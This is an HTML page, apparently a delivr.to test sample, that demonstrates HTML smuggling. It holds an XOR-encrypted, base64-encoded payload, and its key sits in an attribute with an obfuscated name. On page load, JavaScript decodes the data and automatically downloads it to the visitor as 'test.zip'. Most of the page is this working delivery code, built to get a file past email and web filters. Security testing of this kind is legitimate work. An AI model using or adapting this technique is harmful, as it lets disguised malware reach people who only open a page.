<!DOCTYPE html>
<html lang="en-us">
    <head>
        <title>XOR Encryption</title>
    </head>
    <body>
        <section class="a">
            <header>
                <h1>delivr.to</h1>
                <h3>HTML Smuggling with XOR Payload</h3>
                <p>Download autostarts!</p>
            </header>
        </section>

        <div id='b' class='e' data="IX1BcDUqaCIzIngnJT0PThRGMHoEXDQaCBJ+JXAjehc3MjE6Nyc5c1UwOh4SekURAl1OFwYjGkAvVg0xcSU5HWl7WDcwEFAdUmw/HAEcO1kTbWxXACFhMhB4LiJdR3xbGlVrBz5cBiofBQQlHRh2CzwJMRNfTSAHfiVkfHwfXSUnaQtiGTt6SBAZa1kJLAsAPSUQCl10PAshNHIlcCN4OTQiMTI3JzlzcDYtJTd4MSAgLiAidCQvcyknLyVxKzs2eHh3BFAMCh1WVDsvCkQwBRFIb0ZIXwQ2O0sCAUdZUwFCFnUKA0A2Mi0+VhkfKQcIQDJZSw46T05fEEJUAxc/CUN1AWxOBXMNPRdMJABJSFMOWB4JGVQNEFA9BCJyOnw0XhAnBBgvAnlaR1pLD3c6IlACV1INCj5YB1YCVmYrTDxAX1kIKhIPCARHHBc7PDRJTUliBTczQ0hbBgUpOWUNUAdoD1sGW1gdLiA+QhNKVyFKSQtKSBRNYAAkWGZnASI1Ihdkfk5fXgACKEMdHkosWksTJ2FaDyovBDMCM2Y0b0gjEigZWVA3aH9CGSosTz8WWTgxCWcEIWRdSSg2YUVOAXEJUjZVDWMhXkxZMyceTVMHenABGwdUVy53MCkbS1x4GgFfRydaHCgQVygkQR5nJl1MWj4SMlcNYRR8T0A4VRBbDx0DRzgIFD0NUg1PVygGVyAwUkADLhA3IgUWCCl3MSI1IDQ8IS51XC8nDjsLBisDAxAaVCANQAQyFk9aHzdDalQFOQwJYAECAQdICz1PQBhiV18+EGA2HGQ2GB5QQAZYbVEYIAgFDi1dIFEeFVc9GAsmSG8nKQ1SInJ9ciYdPAwTW1hFJXEQISxPIlEXLHpXWBALKAEIHxUMUVxFMFNXNDIxMhEtSWRcWF8jQU9EByAuICJBEQBBEghBNHEdOzZ4eHA6OwthK1UeDBtCEDdwNXV3ABRNBU1eARIyLXB0dyh3TB9fbBhISFQNPBMcXSRKTAEwfUkaTnIMV2R4K0IoBmFCfiEJFiwDE1wgVlcfRjk6KWtZD08SFA9SDQAOTgJaF1s/QFERe0ANPxAGFgApEAglIgBKOn4QPBgoA1lRBWEOGy1XCV0pUQImCgRBDENDdlB+NwxTTwcdFzYtcHR3KHh5LTF5Lzs4JS4oNDJ0LTM5KDl4Izl1cTd1d3QzLDA1eXN1Nil4IjMieC8lOSZ2OTYpeS53JSsjNHIlcCN4OTQiMTI3JzlzcDYtJTd4MSAgLiAidCQvcyknLyVxKzs2eHh1IiA4eDBydDc5LDY7cDV5d3M4NXc5KHMgMi1wdHcoeHktMXkvOzglLig0MnQtMzkoOXgjOXVxN3V3dDMsMDV5c3U2KXgiMyJ4LyU5JnY5Nil5LnclKyM0ciVwI3g5NCIxMjcnOXNwNi0lN3gxICAuICJ0JC9zKScvJXErOzZ4eHUiIDh4MHJ0NzksNjtwNXl3czg1dzkocyAyLXB0dyh4eS0xeS87OCUuKDQydC0zOSg5eCM5dXE3dXd0MywwNXlzdTYpeCIzIngvJTkmdjk2KXkudyUrIzRyJXAjeDk0IjEyNyc5c3A2LSU3eDEgIC4gInQkL3MpJy8lcSs7Nnh4dSIgOHgwcnQ3OSw2O3A1eXdzODV3OShzIDItcHR3KHh5LTF5Lzs4JSsOF0oBKCc9Gjp4BTl1djd1d3QzCjAncHlsIQt+MD9IVCElDyZ2OTwPfi53AysjNHIlcCN4OTQiMTI3JzlzcDYtJTdxIg0CXDAWVD0gRD0jHSJyDTs2eHh1ISA4fDB9Ujc5LDsrdTV5d3M4NQtF"></div>
        <div id='wjcwgcvg' class='kmoitfcv' data="t824wh9crc9ndxg7xwh8o6djbu3d1b9xucpsvfx21wldv9paaoac5en2hfnd0jzw994cay9q35vxmwz1t862yt6xi2asl156i98lp8nzydoius5lrxix9bx40v465rmq"></div>        
        
        <script>
            
            document.body.onload = function (){
                var f = xor_func(document.getElementById("b").getAttribute("data"), document.getElementById('wjcwgcvg').getAttribute('data'));
                trigger(to_blob(f, 512));
            };

            function xor_func(crhvmojz,hkusixgc) {
              crhvmojz = atob(crhvmojz);
              var mohcsjnh = ''
              for(var i=0; i<crhvmojz.length; i++) {
                mohcsjnh += String.fromCharCode(crhvmojz.charCodeAt(i) ^ hkusixgc[i%hkusixgc.length].charCodeAt(0))
              }
              return mohcsjnh;
            }

            function to_blob(b64_blob, chunk_size)
            {
                var payload = [];

                var blob_bytes = atob(b64_blob);

                for(var i = 0; i < blob_bytes.length; i += chunk_size)
                {
                    var blob_chunk = blob_bytes.slice(i, i + chunk_size);
                    var b_array = new Array(blob_chunk.length);

                    for(var a = 0; a < blob_chunk.length; a++)
                    {
                        b_array[a] = blob_chunk.charCodeAt(a);
                    }

                    var uint_array = new Uint8Array(b_array);
                    payload.push(uint_array);
                }

                var out = new Blob(payload, {type: "octet/stream"});
                return out;
            }

            function trigger(out)
            {
                let fd = new File([out], "test.zip", {type: "octet/stream"});
                let fd_url = URL["createObjectURL"](fd);
                var a = document.createElement("a");
                document.body.appendChild(a);

                a.setAttribute("href",fd_url);
                a.download = 'test.zip';
                a.click();
                URL.revokeObjectURL(fd_url);
            }
        </script>
  </body>
</html>